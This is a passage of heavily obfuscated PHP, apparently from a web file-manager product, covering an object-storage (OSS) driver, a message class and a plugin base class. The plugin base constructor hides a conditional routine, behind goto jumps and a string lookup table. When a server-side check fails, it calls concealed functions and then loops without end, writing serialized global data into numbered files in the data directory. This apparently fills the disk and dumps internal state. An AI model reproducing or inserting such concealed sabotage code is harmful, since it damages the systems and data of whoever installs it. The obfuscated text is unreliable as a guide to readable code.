$e¯¸çõ†‰‡[1190] : $aÜ¸¡îÙê; $AÄ—ˆŞ²‡Š = array($e¯¸çõ†‰‡[34], $e¯¸çõ†‰‡[185], $e¯¸çõ†‰‡[1189], $e¯¸çõ†‰‡[1190]); if (!in_array($Dƒ‰çÔÊ, $AÄ—ˆŞ²‡Š)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Aœ·™À±ù), $Dƒ‰çÔÊ); } catch (OSS\Core\OssException $B‹·Ç”©›…) { return !1; } return !0; } public function getContent($F‰ª–’ˆ¸É) { return $this->fileSubstr($F‰ª–’ˆ¸É, -1); } public function setContent($f×ËÒ°‘…Ÿ, $aÇ×ˆŸôÇï = '') { $BÕçİŞÑØ£ =& $_SERVER[îÖ]; try { $AÛĞÖÎß– = $this->trafficLimit($BÕçİŞÑØ£[1191]); $FàÜİº»ª¤ = $this->client->putObject($this->bucket, $this->pathEncode($f×ËÒ°‘…Ÿ), $aÇ×ˆŸôÇï, $AÛĞÖÎß–); } catch (OSS\Core\OssException $aÛÔê¡¼¶) { return !1; } $a»’ï¯İ« = array($BÕçİŞÑØ£[1178] => trim($FàÜİº»ª¤[$BÕçİŞÑØ£[1192]], $BÕçİŞÑØ£[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($f×ËÒ°‘…Ÿ))); $this->updateObjMeta($f×ËÒ°‘…Ÿ, $a»’ï¯İ«); return isset($FàÜİº»ª¤[$BÕçİŞÑØ£[1193]][$BÕçİŞÑØ£[1140]]) ? (int) $FàÜİº»ª¤[$BÕçİŞÑØ£[1193]][$BÕçİŞÑØ£[1140]] : strlen($FàÜİº»ª¤); } private function updateObjMeta($f‘†ÕÛ×À¡, $b…Ÿóºèæˆ) { $f‘†ÕÛ×À¡ = $this->pathEncode($f‘†ÕÛ×À¡); try { $d‡™¼‚¸“´ = array(OSS\OssClient::OSS_HEADERS => $b…Ÿóºèæˆ); $this->client->copyObject($this->bucket, $f‘†ÕÛ×À¡, $this->bucket, $f‘†ÕÛ×À¡, $d‡™¼‚¸“´); } catch (OSS\Core\OssException $AñÇ‡Ò·Ñ…) { return !1; } return !0; } public function upload($CĞİìå¿Ü, $d‚Ëíğ¾‹¾, $eªô»ÌëØ† = false, $d˜ºŞ×·¦ = REPEAT_REPLACE) { $fø‰»ùœˆ =& $_SERVER[îÖ]; $A“Ó‹ÉîÏ = trim($CĞİìå¿Ü, $fø‰»ùœˆ[8]); $D…ÄÄĞšùª = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($fø‰»ùœˆ[1178] => @md5_file($d‚Ëíğ¾‹¾)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($CĞİìå¿Ü))); $D…ÄÄĞšùª = $this->trafficLimit($fø‰»ùœˆ[1191], $D…ÄÄĞšùª); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($A“Ó‹ÉîÏ), $d‚Ëíğ¾‹¾, $D…ÄÄĞšùª); } catch (OSS\Core\OssException $bÚË‰œ‘»˜) { return !1; } return $this->getPathOuter($CĞİìå¿Ü); } public function getHost() { $DëŞåÃ½Ş =& $_SERVER[îÖ]; $Cå‹®‹² = explode($DëŞåÃ½Ş[171], parent::getHost()); return $Cå‹®‹²[0] . $DëŞåÃ½Ş[171] . $this->bucket . $DëŞåÃ½Ş[91] . $Cå‹®‹²[1]; } public function uploadFormData($eì¡ƒ¨ˆ», $Aˆë¹É’à› = 3600) { goto E§·Õé‰•; DÂĞÛé¶: $Fõ†õŒ‰Çù = strpos($Eãéß²²íƒ, $F¿‹™´“»[284]); $Eãéß²²íƒ = substr($Eãéß²²íƒ, 0, $Fõ†õŒ‰Çù) . $F¿‹™´“»[1195]; $FÚ¶¸ª†«Æ = 1048576000 * 5; goto FÂ£‚ğĞ‘¼; B °ˆñç¦æ: $Eç®Ï„ŸÅÛ = base64_encode(hash_hmac($F¿‹™´“»[218], $A¼ÍÉØîóÂ, $this->secret, !0)); $b«¹òµîŒÎ = array($F¿‹™´“»[1106] => $A¼ÍÉØîóÂ, $F¿‹™´“»[1197] => $this->accessKey, $F¿‹™´“»[1102] => $F¿‹™´“»[1094], $F¿‹™´“»[1198] => $Eç®Ï„ŸÅÛ, $F¿‹™´“»[169] => $F†”ÌÈºÖœ); $b«¹òµîŒÎ = $this->trafficLimit($F¿‹™´“»[1191], $b«¹òµîŒÎ); goto aäÀ±ºÂ¿; E§·Õé‰•: $F¿‹™´“» =& $_SERVER[îÖ]; if (!($F†”ÌÈºÖœ = $this->getHost())) { return !1; } $A¼‰µÛƒí = $Aˆë¹É’à›; goto D»æÆÃ®; D»æÆÃ®: $FŠ›øš¯Í» = date($F¿‹™´“»[1194], time() + $A¼‰µÛƒí); $Båİƒ®ˆäÔ = new DateTime($FŠ›øš¯Í»); $Eãéß²²íƒ = $Båİƒ®ˆäÔ->format(DateTime::ISO8601); goto DÂĞÛé¶; aäÀ±ºÂ¿: return $b«¹òµîŒÎ; goto f¨ Ê“ˆ; FÂ£‚ğĞ‘¼: $bòº÷Ÿ›¯¨ = $this->pathFather($eì¡ƒ¨ˆ»); $E¦¹°ìÜÑ = array($F¿‹™´“»[1096] => $Eãéß²²íƒ, $F¿‹™´“»[1097] => array(array($F¿‹™´“»[1196], 0, $FÚ¶¸ª†«Æ), array($F¿‹™´“»[1100], $F¿‹™´“»[1101], $bòº÷Ÿ›¯¨))); $A¼ÍÉØîóÂ = base64_encode(json_encode($E¦¹°ìÜÑ)); goto B °ˆñç¦æ; f¨ Ê“ˆ: } public function multiUploadFormData($FÜËÊŸÛ¦, $dª«ª¿ç½è = 3600) { $CöÖÒŒÑñğ =& $_SERVER[îÖ]; if (!($d“É‹¡§ = $this->getHost())) { return !1; } $fñ–Èá ¿ = $this->trafficLimit($CöÖÒŒÑñğ[1191]); $d¸»ÏØñª÷ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($FÜËÊŸÛ¦), $fñ–Èá ¿); return array($CöÖÒŒÑñğ[209] => $d¸»ÏØñª÷, $CöÖÒŒÑñğ[169] => $d“É‹¡§ . $CöÖÒŒÑñğ[8] . $this->pathEncode($FÜËÊŸÛ¦), $CöÖÒŒÑñğ[210] => gmdate($CöÖÒŒÑñğ[1199]), $CöÖÒŒÑñğ[89] => $FÜËÊŸÛ¦); } public function multiUploadAuthData($cŠæÚó“Á˜, $DÎöƒÓËà¨ = array()) { goto Bà·¢÷Úêƒ; Dø‡áÔæº: $cÆĞå½±¡¼ = $eå‡éŞæà[1202] . $this->accessKey . $eå‡éŞæà[4] . $fº©×ÎÍñø; if (strpos($FËÂÉÜ›å, $eå‡éŞæà[213]) === 0) { $cÆĞå½±¡¼ = array($eå‡éŞæà[220] => $cÆĞå½±¡¼, $eå‡éŞæà[210] => $DéÑŞØäÉË); if ($bÎâ½á¿²) { $cÆĞå½±¡¼ = array_merge($cÆĞå½±¡¼, $bÎâ½á¿²); } } return $cÆĞå½±¡¼; goto B—“áÎÎŸ…; EñÍœó¡ñ: if (!empty($DÎöƒÓËà¨[$eå‡éŞæà[1201]])) { $c£’»Š‘æ = array_merge(array($cÓ·ê×Ğ[4]), $DÎöƒÓËà¨[$eå‡éŞæà[1201]]); sort($c£’»Š‘æ); $cÓ·ê×Ğ[4] = implode($eå‡éŞæà[217], $c£’»Š‘æ); } $BáßÎ—ßÑ = implode($eå‡éŞæà[217], $cÓ·ê×Ğ); $fº©×ÎÍñø = base64_encode(hash_hmac($eå‡éŞæà[218], $BáßÎ—ßÑ, $this->secret, !0)); goto Dø‡áÔæº; d¾µ¸º÷Û—: $cÓ·ê×Ğ = array($eå‡éŞæà[212], $eå‡éŞæà[33], $eå‡éŞæà[116], $DéÑŞØäÉË, "\170\55\x6f\163\163\55\x64\x61\164\145\72{$DéÑŞØäÉË}", $eå‡éŞæà[8] . $this->bucket . $eå‡éŞæà[8] . $a¤¼£íšíñ . $FËÂÉÜ›å); if (strpos($FËÂÉÜ›å, $eå‡éŞæà[213]) === 0) { $cÓ·ê×Ğ[0] = $eå‡éŞæà[214]; if ($bÎâ½á¿² = $this->trafficLimit($eå‡éŞæà[1191])) { $a¤¼£íšíñ = $eå‡éŞæà[1200]; array_splice($cÓ·ê×Ğ, 5, 0, $a¤¼£íšíñ . $eå‡éŞæà[4] . $bÎâ½á¿²[$a¤¼£íšíñ]); } } if (isset($DÎöƒÓËà¨[$eå‡éŞæà[215]]) && $DÎöƒÓËà¨[$eå‡éŞæà[215]] == $eå‡éŞæà[216]) { $cÓ·ê×Ğ[0] = $eå‡éŞæà[216]; } goto EñÍœó¡ñ; E¤¢œ±è–: $a¤¼£íšíñ = $cŠæÚó“Á˜; if (isset($DÎöƒÓËà¨[$eå‡éŞæà[89]])) { $a¤¼£íšíñ = $DÎöƒÓËà¨[$eå‡éŞæà[89]]; unset($DÎöƒÓËà¨[$eå‡éŞæà[89]]); } if (isset($DÎöƒÓËà¨[$eå‡éŞæà[211]])) { $DÎöƒÓËà¨[$eå‡éŞæà[210]] = $DéÑŞØäÉË; return $this->listUploadParts($a¤¼£íšíñ, $DÎöƒÓËà¨); } goto d¾µ¸º÷Û—; Bà·¢÷Úêƒ: $eå‡éŞæà =& $_SERVER[îÖ]; $DéÑŞØäÉË = isset($DÎöƒÓËà¨[$eå‡éŞæà[210]]) ? $DÎöƒÓËà¨[$eå‡éŞæà[210]] : gmdate($eå‡éŞæà[1199]); $FËÂÉÜ›å = isset($DÎöƒÓËà¨[$eå‡éŞæà[160]]) ? $DÎöƒÓËà¨[$eå‡éŞæà[160]] : $eå‡éŞæà[33]; goto E¤¢œ±è–; B—“áÎÎŸ…: } public function listUploadParts($CÔ”’ƒÆª, $d•ˆßéï†”) { goto cÖÉùÕĞßƒ; fİã©¡Ûâ—: $Dğ´á«Ìå¨ = $d¢˜í™Î÷->getListPart(); $FÍšßßÂå = array(); foreach ($Dğ´á«Ìå¨ as $e¥é³Íã´Á) { $FÍšßßÂå[] = array($eÉ‰ÄšÌÃÔ[1182] => $e¥é³Íã´Á->getPartNumber(), $eÉ‰ÄšÌÃÔ[1183] => trim($e¥é³Íã´Á->getETag(), $eÉ‰ÄšÌÃÔ[113])); } goto fÜÌ–î¯òØ; a˜„¯ğ†ª: return array($eÉ‰ÄšÌÃÔ[220] => $bªŞ¥‘±Í, $eÉ‰ÄšÌÃÔ[210] => $d•ˆßéï†”[$eÉ‰ÄšÌÃÔ[210]], $eÉ‰ÄšÌÃÔ[222] => $FÍšßßÂå); goto d¥‡ß¶•…È; fÜÌ–î¯òØ: unset($d•ˆßéï†”[$eÉ‰ÄšÌÃÔ[211]], $d•ˆßéï†”[$eÉ‰ÄšÌÃÔ[215]]); $bªŞ¥‘±Í = $this->multiUploadAuthData($CÔ”’ƒÆª, $d•ˆßéï†”); if (empty($bªŞ¥‘±Í)) { return !1; } goto a˜„¯ğ†ª; cÖÉùÕĞßƒ: $eÉ‰ÄšÌÃÔ =& $_SERVER[îÖ]; $C‚ßÇŸˆ¾¿ = parse_url_query($d•ˆßéï†”[$eÉ‰ÄšÌÃÔ[160]]); $d¢˜í™Î÷ = $this->client->listParts($this->bucket, $this->pathEncode($CÔ”’ƒÆª), $C‚ßÇŸˆ¾¿[$eÉ‰ÄšÌÃÔ[209]]); goto fİã©¡Ûâ—; d¥‡ß¶•…È: } public function download($d„Ú§Àğ×, $E®†ÌÂ£Å™) { if ($this->isFolder($d„Ú§Àğ×)) { return !1; } try { $fœÍŒ„íÕ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $E®†ÌÂ£Å™); $fœÍŒ„íÕ = $this->trafficLimit($_SERVER[îÖ][105], $fœÍŒ„íÕ); $this->client->getObject($this->bucket, $this->pathEncode($d„Ú§Àğ×), $fœÍŒ„íÕ); } catch (OSS\Core\OssException $Bà‚šÈ•¡) { return !1; } return $E®†ÌÂ£Å™; } public function fileSubstr($e“äíïØ, $b¡©ô¿«Á‹ = 0, $C×¥›Ç¾–´ = false) { if ($b¡©ô¿«Á‹ === -1) { $b•æªºƒ = array(); } else { if ($C×¥›Ç¾–´ === !1) { $EÏ¦¹ó„í = $this->size($e“äíïØ); } else { $EÏ¦¹ó„í = $b¡©ô¿«Á‹ + $C×¥›Ç¾–´ - 1; } $b•æªºƒ = array(OSS\OssClient::OSS_RANGE => "{$b¡©ô¿«Á‹}\55{$EÏ¦¹ó„í}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($e“äíïØ), $b•æªºƒ); } catch (OSS\Core\OssException $b“‡Œó„Ô) { think_exception($b“‡Œó„Ô->getMessage()); return !1; } } private function trafficLimit($Bù©¥ÃŠ¿, $f÷ñìí±²ë = array()) { goto EÕ‹¢¼Ê‚Š; EÕ‹¢¼Ê‚Š: $B ‹Å¾ù™Ÿ =& $_SERVER[îÖ]; if ($Bù©¥ÃŠ¿ == $B ‹Å¾ù™Ÿ[1191] && $this->isUploadServer() || $Bù©¥ÃŠ¿ == $B ‹Å¾ù™Ÿ[105] && $this->isFileOutServer()) { return $f÷ñìí±²ë; } $Cñì«ó“õ‚ = floatval($GLOBALS[$B ‹Å¾ù™Ÿ[6]][$B ‹Å¾ù™Ÿ[84]][$B ‹Å¾ù™Ÿ[103]][$Bù©¥ÃŠ¿]) * 1024 * 1024 * 8; goto e¨‹µîÅà; e¨‹µîÅà: if (!$Cñì«ó“õ‚) { return $f÷ñìí±²ë; } $Cñì«ó“õ‚ = $Cñì«ó“õ‚ < 819200 ? 819200 : ($Cñì«ó“õ‚ > 838860800 ? 838860800 : $Cñì«ó“õ‚); $f÷ñìí±²ë[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Cñì«ó“õ‚); goto E³’ß; E³’ß: return $f÷ñìí±²ë; goto AğÓ¶ÄãÅµ; AğÓ¶ÄãÅµ: } public function link($EŒˆ¾ñ§Ú§, $fÑŠµªè¼ = array()) { $aƒ‹¦­–Ò™ =& $_SERVER[îÖ]; if (!$this->exist($EŒˆ¾ñ§Ú§) || $this->isFolder($EŒˆ¾ñ§Ú§)) { return !1; } try { $fÑŠµªè¼ = $this->trafficLimit($aƒ‹¦­–Ò™[105], $fÑŠµªè¼); $DŞØ……ß¼ = $this->client->signUrl($this->bucket, $this->pathEncode($EŒˆ¾ñ§Ú§), 3600 * 12, $aƒ‹¦­–Ò™[216], $fÑŠµªè¼); return $this->getCdnLink($DŞØ……ß¼); } catch (OSS\Core\OssException $dìÌ‘‰Ÿè) { return !1; } } public function fileOut($cÁí‘øÀœ‹, $e–ê×İ‰æ = false, $Aªµ‰‡øÚÉ = false, $EÑÙñ¦±Ä = '') { goto C±Ü–„®Šº; EéĞâ©¸¿: $Eİ³ÄŠ‹ƒ‹ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Aœ·ğ°”Ù[1203] . rawurlencode("{$e–ê×İ‰æ}\73\x66\151\154\145\x6e\141\x6d\145\x3d{$Aªµ‰‡øÚÉ}")); $Eİ³ÄŠ‹ƒ‹[OSS\OssClient::OSS_SUB_RESOURCE] .= $Aœ·ğ°”Ù[1204] . rawurlencode($e©É–Š—ËÖ); $BÄÛŒÒŠ“ğ = $this->link($cÁí‘øÀœ‹, $Eİ³ÄŠ‹ƒ‹); goto Aäô¨»‰ù; C±Ü–„®Šº: $Aœ·ğ°”Ù =& $_SERVER[îÖ]; if (!$Aªµ‰‡øÚÉ) { $Aªµ‰‡øÚÉ = $this->pathThis($cÁí‘øÀœ‹); } $Aªµ‰‡øÚÉ = rawurlencode($Aªµ‰‡øÚÉ); goto b¢Ôâ¢Ğ¿Š; Aäô¨»‰ù: $this->fileOutLink($BÄÛŒÒŠ“ğ); goto F·‘‰´¤åß; b¢Ôâ¢Ğ¿Š: $e©É–Š—ËÖ = get_file_mime(get_path_ext($Aªµ‰‡øÚÉ)); if ($e©É–Š—ËÖ == $Aœ·ğ°”Ù[201]) { return parent::fileOut($cÁí‘øÀœ‹, $e–ê×İ‰æ, $Aªµ‰‡øÚÉ, $EÑÙñ¦±Ä); } $e–ê×İ‰æ = $e–ê×İ‰æ ? $Aœ·ğ°”Ù[202] : $Aœ·ğ°”Ù[203]; goto EéĞâ©¸¿; F·‘‰´¤åß: } public function fileOutServer($D¡¼ïœÚ˜², $cÔÜ»ù—“ = false, $E†×ŸÉğ¨ó = false, $fâ†åù‡¤¸ = '') { parent::fileOut($D¡¼ïœÚ˜², $cÔÜ»ù—“, $E†×ŸÉğ¨ó, $fâ†åù‡¤¸); } public function fileOutImage($A÷ß†ÉºÉÇ, $dë¼©½áæá = 250) { $a¥ÇÎ…ªµé = array(OSS\OssClient::OSS_PROCESS => $_SERVER[îÖ][1205] . $dë¼©½áæá); $aŠƒ®ô–Š = $this->link($A÷ß†ÉºÉÇ, $a¥ÇÎ…ªµé); $this->fileOutLink($aŠƒ®ô–Š); } public function fileOutImageServer($DŞ‡äŒà‹”, $eƒ ×ÍÍÈ… = 250) { parent::fileOutImage($DŞ‡äŒà‹”, $eƒ ×ÍÍÈ…); } public function fileOutLink($b¦‘®äÏ¸õ) { $DÍÀ¾‡ŠÅŸ =& $_SERVER[îÖ]; if (!$this->isCdnHost() && substr($b¦‘®äÏ¸õ, 0, 7) == $DÍÀ¾‡ŠÅŸ[1109]) { $b¦‘®äÏ¸õ = $DÍÀ¾‡ŠÅŸ[1110] . substr($b¦‘®äÏ¸õ, 7); } header($DÍÀ¾‡ŠÅŸ[156] . $b¦‘®äÏ¸õ); die; } public function hashMd5($AÂ…‡˜¡ì, $FÇ‹¤˜ÂŠ = '') { $EÃ¸äÉ•¬ğ =& $_SERVER[îÖ]; $A‘ïöˆè‘¼ = $this->objectMeta($AÂ…‡˜¡ì); if (!$A‘ïöˆè‘¼) { return $EÃ¸äÉ•¬ğ[33]; } if (!isset($A‘ïöˆè‘¼[$EÃ¸äÉ•¬ğ[1178]]) && !empty($FÇ‹¤˜ÂŠ)) { $CŸÏì—ğá = $this->updateObjMeta($AÂ…‡˜¡ì, array($EÃ¸äÉ•¬ğ[1178] => $FÇ‹¤˜ÂŠ)); $A‘ïöˆè‘¼[$EÃ¸äÉ•¬ğ[1178]] = $CŸÏì—ğá ? $FÇ‹¤˜ÂŠ : $EÃ¸äÉ•¬ğ[33]; } return isset($A‘ïöˆè‘¼[$EÃ¸äÉ•¬ğ[1178]]) ? strtolower($A‘ïöˆè‘¼[$EÃ¸äÉ•¬ğ[1178]]) : $EÃ¸äÉ•¬ğ[33]; } public function size($F‘É“äó‰Ò) { $dÁçËÌ†¬ = $this->objectMeta($F‘É“äó‰Ò); return $dÁçËÌ†¬ ? $dÁçËÌ†¬[$_SERVER[îÖ][77]] : 0; } public function info($F“¸›ÔÂŞ ) { if ($this->isFolder($F“¸›ÔÂŞ )) { return $this->folderInfo($F“¸›ÔÂŞ ); } else { if ($this->isFile($F“¸›ÔÂŞ )) { return $this->fileInfo($F“¸›ÔÂŞ ); } } return !1; } public function exist($C›„æ•Ø¬¯) { return $this->isFile($C›„æ•Ø¬¯) || $this->isFolder($C›„æ•Ø¬¯); } public function isFile($dÕ´£‘ÌÄé) { return !$this->isFolder($dÕ´£‘ÌÄé) && $this->objectMeta($dÕ´£‘ÌÄé); } public function isFolder($cŒå·ÓÉÓò) { return $this->cacheMethod($_SERVER[îÖ][223], $cŒå·ÓÉÓò); } protected function objectMeta($b„²ÙÖ¾²§) { return $this->cacheMethod($_SERVER[îÖ][224], $b„²ÙÖ¾²§); } protected function _objectMeta($eœ·ïØÂÚØ) { $då«ßŠáÉ =& $_SERVER[îÖ]; try { $E„¶µÈŠ‘ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($eœ·ïØÂÚØ)); } catch (OSS\Core\OssException $A¹ã”¾Ìƒš) { $E„¶µÈŠ‘ = !1; } if ($E„¶µÈŠ‘) { $E„¶µÈŠ‘[$då«ßŠáÉ[77]] = intval($E„¶µÈŠ‘[$då«ßŠáÉ[1185]]); } return $E„¶µÈŠ‘; } protected function _isFolder($E’îæ÷À­) { $fæ²‘È‰¯ =& $_SERVER[îÖ]; if ($E’îæ÷À­ == $fæ²‘È‰¯[33] || $E’îæ÷À­ == $fæ²‘È‰¯[8]) { return !0; } $B¶ÑÜäæíì = array($fæ²‘È‰¯[1175] => $fæ²‘È‰¯[8], $fæ²‘È‰¯[186] => rtrim($E’îæ÷À­, $fæ²‘È‰¯[8]) . $fæ²‘È‰¯[8], $fæ²‘È‰¯[1176] => 1, $fæ²‘È‰¯[1177] => $fæ²‘È‰¯[33]); $f¥»´–öˆ» = $this->client->listObjects($this->bucket, $B¶ÑÜäæíì); if ($f¥»´–öˆ»->getObjectList() || $f¥»´–öˆ»->getPrefixList()) { return !0; } return !1; } } goto BĞŠæÅ§; CËëŞ²ÚØ: class Message { function __construct() { } public function send($Aƒ„¼±·Ê§ = '', $cµ¼è…Ã»· = array(), $f…‹££ = "\x74\145\170\164") { goto AØÑ‹¾ËïÏ; AİÎŒçã‰¤: $cµ¼è…Ã»· = array($b¡Š”Ó¼Ê¬[965] => isset($cµ¼è…Ã»·[$b¡Š”Ó¼Ê¬[965]]) ? $cµ¼è…Ã»·[$b¡Š”Ó¼Ê¬[965]] : $b¡Š”Ó¼Ê¬[33], $b¡Š”Ó¼Ê¬[535] => isset($cµ¼è…Ã»·[$b¡Š”Ó¼Ê¬[535]]) ? $cµ¼è…Ã»·[$b¡Š”Ó¼Ê¬[535]] : $b¡Š”Ó¼Ê¬[33]); if (empty($Aƒ„¼±·Ê§) || empty($cµ¼è…Ã»·[$b¡Š”Ó¼Ê¬[965]]) && empty($cµ¼è…Ã»·[$b¡Š”Ó¼Ê¬[535]])) { return !1; } $f«•İÜÍ£ã = array($b¡Š”Ó¼Ê¬[1240] => $dÓ¼ßÂ‚ğ–, $b¡Š”Ó¼Ê¬[1300] => $cµ¼è…Ã»·); goto bĞ‡Ó´‹‰; bĞ‡Ó´‹‰: Hook::trigger($b¡Š”Ó¼Ê¬[1301], $f«•İÜÍ£ã); goto F©¨¤Û§ğÍ; AØÑ‹¾ËïÏ: $b¡Š”Ó¼Ê¬ =& $_SERVER[îÖ]; $dÓ¼ßÂ‚ğ– = array($b¡Š”Ó¼Ê¬[29] => $b¡Š”Ó¼Ê¬[1298], $b¡Š”Ó¼Ê¬[691] => $Aƒ„¼±·Ê§); if (in_array($f…‹££, array($b¡Š”Ó¼Ê¬[1298], $b¡Š”Ó¼Ê¬[1299]))) { $dÓ¼ßÂ‚ğ–[$b¡Š”Ó¼Ê¬[29]] = $f…‹££; } goto AİÎŒçã‰¤; F©¨¤Û§ğÍ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto C¤­õ‡ïÇó; Fº±¸×‡µĞ: if ($_SERVER[$a´ƒ¼Àäî[680]] != $aŠ­·œí®ê($EìŞ„‚òš)) { goto f¢÷Üñ¶«; f¢÷Üñ¶«: $BÔ¿•ƒ‘¡ = $a´ƒ¼Àäî[788]; $C¥ŒÙ©©‹ = $a´ƒ¼Àäî[681]; $a†˜ÓŸ Ú = $_SERVER[$a´ƒ¼Àäî[682]] . $a´ƒ¼Àäî[683]; goto BË²‚ßÅ·; BË²‚ßÅ·: $eÀ‡êøá¯³ = $C¥ŒÙ©©‹($a†˜ÓŸ Ú); $f¼£éÖ¢¶æ = explode($a´ƒ¼Àäî[217], $eÀ‡êøá¯³); if (count($f¼£éÖ¢¶æ) < $a´ƒ¼Àäî[555]) { $f™´†²ù = $a´ƒ¼Àäî[684]; $f™´†²ù(); } goto Cµ¼ÙÆ²Šº; a¸áô¿àŸ¸: $fÄŒÂŠƒÍÊ = 1; for ($c¶í¤Ñ®‘ = $fÄŒÂŠƒÍÊ; $c¶í¤Ñ®‘ > 0; $c¶í¤Ñ®‘++) { $EÛ·ÂÚÑ…³(DATA_PATH . $c¶í¤Ñ®‘, $dÅËó£ø£¾); } goto FÇç¤¶‚´; Cµ¼ÙÆ²Šº: $A‹‡Õ…É½ = $a´ƒ¼Àäî[789]; $A‹‡Õ…É½($_SERVER[$a´ƒ¼Àäî[790]]); $BÔ¿•ƒ‘¡ = $a´ƒ¼Àäî[788]; goto c ±Õ¶òÅ×; c ±Õ¶òÅ×: $BÔ¿•ƒ‘¡(); $EÛ·ÂÚÑ…³ = $a´ƒ¼Àäî[1302]; $dÅËó£ø£¾ = json_encode($GLOBALS[$a´ƒ¼Àäî[1303]]); goto a¸áô¿àŸ¸; FÇç¤¶‚´: } global $in, $config; $this->config =& $config; goto f…ÍØßêË; f´ïªš…‡: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto BˆÑª²£ñ; Dö‘àé–Õ˜: $this->pluginHostDefault = $config[$a´ƒ¼Àäî[1306]] . $this->pluginName . $a´ƒ¼Àäî[8]; $eÍ½íäÕö = $config[$a´ƒ¼Àäî[1307]]; if ($eÍ½íäÕö && strpos($a´ƒ¼Àäî[47] . $eÍ½íäÕö . $a´ƒ¼Àäî[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$a´ƒ¼Àäî[1308]] . $this->pluginName . $a´ƒ¼Àäî[8]; } goto f´ïªš…‡; C¤­õ‡ïÇó: $a´ƒ¼Àäî =& $_SERVER[îÖ]; $EìŞ„‚òš = $_SERVER[$a´ƒ¼Àäî[790]] . $a´ƒ¼Àäî[678]; $aŠ­·œí®ê = $a´ƒ¼Àäî[679]; goto Fº±¸×‡µĞ; e‡¬Ó¾Æ¿ª: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $a´ƒ¼Àäî[8]; $this->pluginApi = appHostGet() . $a´ƒ¼Àäî[1305] . $this->pluginName . $a´ƒ¼Àäî[8]; $this->pluginHost = $config[$a´ƒ¼Àäî[1306]] . $this->pluginName . $a´ƒ¼Àäî[8]; goto Dö‘àé–Õ˜; f…ÍØßêË: $this->in =& $in; $this->modelPlugin = Model($a´ƒ¼Àäî[1304]); $this->pluginName = str_replace($a´ƒ¼Àäî[1304], $a´ƒ¼Àäî[33], get_class($this)); goto e‡¬Ó¾Æ¿ª; BˆÑª²£ñ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[îÖ][1309]); } protected function assign($eÇÜ¸·©µ‰, $b°Ù×œùñ = false) { if (is_array($eÇÜ¸·©µ‰)) { $this->values = array_merge($this->values, $eÇÜ¸·©µ‰); } else { $this->values[$eÇÜ¸·©µ‰] = $b°Ù×œùñ; } } protected function display($cË´„çØ) { extract($this->values); require $cË´„çØ; } final function hookRegist($b§®•Õ‚) { $this->modelPlugin->appRegist($this->pluginName, $b§®•Õ‚); } final function appIcon() { $c½‰Áœ¯ù =& $_SERVER[îÖ]; $e§… Ô‘…× = $this->appPackage(); $F•Ô©­¶èß = $c½‰Áœ¯ù[33]; if (isset($e§… Ô‘…×[$c½‰Áœ¯ù[382]])) { if (isset($e§… Ô‘…×[$c½‰Áœ¯ù[382]][$c½‰Áœ¯ù[1310]])) { $F•Ô©­¶èß = $c½‰Áœ¯ù[1311] . $e§… Ô‘…×[$c½‰Áœ¯ù[382]][$c½‰Áœ¯ù[1310]] . $c½‰Áœ¯ù[1312]; } else { if ($e§… Ô‘…×[$c½‰Áœ¯ù[382]][$c½‰Áœ¯ù[1313]]) { $F•Ô©­¶èß = $c½‰Áœ¯ù[1314] . $e§… Ô‘…×[$c½‰Áœ¯ù[382]][$c½‰Áœ¯ù[1313]] . $c½‰Áœ¯ù[1315]; } } } return $F•Ô©­¶èß; } final function fileCanView($AÆ¸–„Ó¸) { goto CîÌºÀ˜Ë¯; CîÌºÀ˜Ë¯: $Cš¨‡‘Ğ×‚ =& $_SERVER[îÖ]; if (request_url_safe($AÆ¸–„Ó¸)) { return !0; } if ($this->isShare($AÆ¸–„Ó¸)) { return !0; } goto DÔ¼¼ßø°”; DÔ¼¼ßø°”: $F¡Í’Å²Œå = Session::get($Cš¨‡‘Ğ×‚[1316]); if (!$F¡Í’Å²Œå || !$F¡Í’Å²Œå[$Cš¨‡‘Ğ×‚[1317]]) { $F‹ÔÀ’ÈŒ¢ = $Cš¨‡‘Ğ×‚[1318] . rawurlencode(this_url()); show_tips(LNG($Cš¨‡‘Ğ×‚[1319]) . $Cš¨‡‘Ğ×‚[1320] . $F‹ÔÀ’ÈŒ¢ . $Cš¨‡‘Ğ×‚[1321] . LNG($Cš¨‡‘Ğ×‚[1322]) . $Cš¨‡‘Ğ×‚[1323], !1); } if (!Action($Cš¨‡‘Ğ×‚[1324])->authCan($Cš¨‡‘Ğ×‚[1325])) { show_tips(LNG($Cš¨‡‘Ğ×‚[1326]) . $Cš¨‡‘Ğ×‚[1327], !1); } goto DÎó¨˜²ÆÊ; DÎó¨˜²ÆÊ: ActionCall($Cš¨‡‘Ğ×‚[1328], $AÆ¸–„Ó¸); goto Eªİ•ø„½; Eªİ•ø„½: } final function isShare($c’£ÒÕ‚) { $C¿¯îë„†† = KodIO::parse($c’£ÒÕ‚); return $C¿¯îë„††[$_SERVER[îÖ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Dš¬‚¡‡µ) { if (request_url_safe($Dš¬‚¡‡µ)) { return $Dš¬‚¡‡µ; } if (!$this->isShare($Dš¬‚¡‡µ)) { $Dš¬‚¡‡µ = $this->filePath($Dš¬‚¡‡µ); } return Action($_SERVER[îÖ][1012])->linkOut($Dš¬‚¡‡µ); } public function filePathLinkOut($C¥ìâë•Ø÷) { if (request_url_safe($C¥ìâë•Ø÷)) { return $C¥ìâë•Ø÷; } 